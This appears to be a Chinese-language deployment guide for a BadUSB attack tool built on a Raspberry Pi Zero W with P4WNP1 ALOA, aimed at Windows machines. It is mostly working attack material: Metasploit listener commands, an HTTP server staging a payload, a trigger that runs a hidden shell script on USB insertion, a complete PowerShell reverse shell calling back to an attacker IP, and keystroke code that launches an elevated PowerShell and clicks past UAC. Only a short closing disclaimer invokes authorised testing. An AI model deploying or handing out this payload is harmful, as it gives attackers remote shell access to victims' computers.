# 部署指南

## 前置条件

1. 树莓派 Zero W 已刷入 P4WNP1 ALOA 系统
2. 攻击机安装 Kali Linux + Metasploit Framework
3. 目标机器为 Windows 10/11/Server

## 网络架构

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│  树莓派      │  USB    │   目标机器   │  网络   │ Kali 攻击机 │
│  172.16.0.1 │ ──────> │  Windows     │ <─────> │ 192.168.x.x │
└─────────────┘         └──────────────┘         └─────────────┘
    BadUSB                被控端                  MSF监听 + HTTP
```

## 部署步骤

### Step 1: 部署到树莓派

```bash
cd p4wnp1-badusb/deploy
python3 deploy.py --attacker-ip 192.168.146.145
```

### Step 2: Kali 攻击机设置

```bash
# 终端 1 - MSF 监听
msfconsole -x "
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168.146.145
set LPORT 4444
exploit
"

# 终端 2 - HTTP 服务器 (分阶段模式)
cd /var/www/html
python3 -m http.server 80
```

### Step 3: P4WNP1 Web 配置

1. 访问 `http://172.16.0.1:8000`
2. 点击 **TriggerActions**
3. 添加新触发器：
   - Event: `TRIGGER_USB_GADGET_CONNECTED`
   - Action: `HIDScript`
   - Script: `staged_shell`

### Step 4: 插入 USB

将树莓派 Zero W 通过 USB 插入目标机器，等待约 5 秒。

## MSF 监听类型选择

| Payload | 稳定性 | 功能 | 推荐度 |
|---------|--------|------|--------|
| shell_reverse_tcp | 高 | 基础cmd shell | ⭐⭐⭐ |
| meterpreter/reverse_tcp | 低 | 高级功能 | ⭐ |
| meterpreter/reverse_http | 中 | 穿透防火墙 | ⭐⭐ |

## 故障排查

### 问题: Session 立刻关闭

**原因**: Meterpreter 二进制协议与 PowerShell shell 不兼容

**解决**: 使用 `shell_reverse_tcp` 替代 `meterpreter/reverse_tcp`

### 问题: 404 错误

**原因**: HTTP 服务器未启动或文件不存在

**解决**:
```bash
# 检查 HTTP 服务器
ps aux | grep http.server

# 检查文件
ls -la /var/www/html/rev.ps1
```

### 问题: USB 无反应

**原因**: P4WNP1 触发器未配置

**解决**: 
1. 访问 Web 管理界面
2. 检查 TriggerActions 配置
3. 确认 HIDScript 选择正确

### 问题: 连接超时

**原因**: 防火墙阻止或 IP 不可达

**解决**:
```bash
# 测试连通性
ping <目标IP>

# 检查端口
nc -zv <目标IP> 4444
```

## 进阶配置

### 使用 Meterpreter

如果必须使用 Meterpreter，需要修改 rev.ps1 使用纯二进制传输：

```powershell
$ip = "192.168.146.145"
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
$s = $c.GetStream()

[byte[]]$buffer = 0..65535 | ForEach-Object { 0 }

while (($i = $s.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $d = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $i)
    $r = (Invoke-Expression $d 2>&1 | Out-String)
    $rb = [System.Text.Encoding]::ASCII.GetBytes($r)
    $s.Write($rb, 0, $rb.Length)
}

$c.Close()
```

### 隐藏执行

在 staged_shell.js 中可以添加更多延迟和隐藏操作：

```javascript
// 等待更长时间让USB设备就绪
delay(3000);

// 使用搜索栏而不是运行窗口
press("GUI");
delay(500);
type("powershell");
delay(1000);
press("CTRL SHIFT ENTER");  // 以管理员权限运行
delay(1000);
press("ALT Y");             // 确认 UAC
delay(500);
```

## 免责声明

本工具仅供授权安全测试使用。使用前请确保：
1. 获得目标系统所有者的书面授权
2. 遵守当地法律法规
3. 仅用于合法的安全评估目的
